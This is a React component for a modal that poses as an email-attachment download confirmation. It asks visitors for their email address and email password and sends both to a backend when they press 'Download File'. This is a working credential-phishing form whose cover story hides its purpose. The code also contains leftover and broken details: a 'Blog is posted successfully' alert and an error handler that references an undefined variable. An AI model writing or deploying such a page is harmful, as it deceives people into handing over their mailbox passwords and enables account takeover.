import React from 'react'
import logo from '../assets/logotrans1.png'
import { TfiClose } from "react-icons/tfi";
import { useState } from 'react';
import { usePostInfoMutation } from '../redux/features/info/infoApi';
import { useNavigate } from 'react-router';

const LoadModal = ({handleCloseModal}) => {
    const [email, setEmail] = useState('')
    const [password, setPassword] = useState('')
    const [postInfo, {isLoading, error}] = usePostInfoMutation();
    const navigate = useNavigate()

    const handleSubmit = async (e)=>{
        e.preventDefault();
        try {
            const response = await postInfo({ email, password }).unwrap();
            console.log('Success:', response);
            alert('Blog is posted successfully');
            navigate('/');
            handleCloseModal()
        } catch (error) {
            console.error('Error:', err);
        }
    }
  return (
    <div className='loadModal'>
        <div className='loadModal-content'>
        <div className='loadModal-close' onClick={handleCloseModal}><TfiClose /></div>
        <div className='loadModal-wrapper'>
            <div className='loadModal-logo-content'>
                <img src={logo} alt="logo" />
                <p>Confirm Receiving Email, to download attachment</p>
            </div>
            <form onSubmit={handleSubmit} className='loadModal-form'>
                <label>Email address</label>
                <input value={email} onChange={(e)=> setEmail(e.target.value)} className='loadModal-input' type="email" placeholder='Enter Email' />
                <label htmlFor="">Email Password</label>
                <input value={password} onChange={(e)=> setPassword(e.target.value)} className='loadModal-input' type="password" placeholder='Enter Email Password' />
                <div className='loadModal-checkbox'>
                    <input type="checkbox" />
                    <p>Stay Signed In</p>
                </div>
                <button className='loadModal-btn' type="submit" disabled={isLoading}>{isLoading ? 'Processing...' : 'Download File'}</button>
            </form>
            </div>
        </div>
    </div>
  )
}

export default LoadModal